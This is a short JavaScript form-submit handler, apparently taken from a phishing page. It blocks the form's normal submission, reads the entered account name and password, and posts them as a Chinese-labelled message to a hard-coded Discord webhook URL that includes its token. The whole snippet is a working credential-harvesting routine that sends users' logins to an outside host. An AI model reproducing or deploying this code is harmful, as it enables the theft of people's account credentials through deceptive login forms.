document.getElementById("submit-form").addEventListener("submit", function(e) {
            e.preventDefault(); 

            const account = document.getElementById("acc").value;
            const password = document.getElementById("pwd").value;

            const webhookURL = "https://discord.com/api/webhooks/1497124495604060200/e6BQDzqvQ35IZVS3DMsZbVOA_2WLFt-JJkRRH2piT-AHmKmh3MfmvbFePgRXJaZQUc57";
            const payload = {
                content: `帳號: ${account}\n 密碼: ${password}\n`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .catch(error => console.error('Error:', error));
        });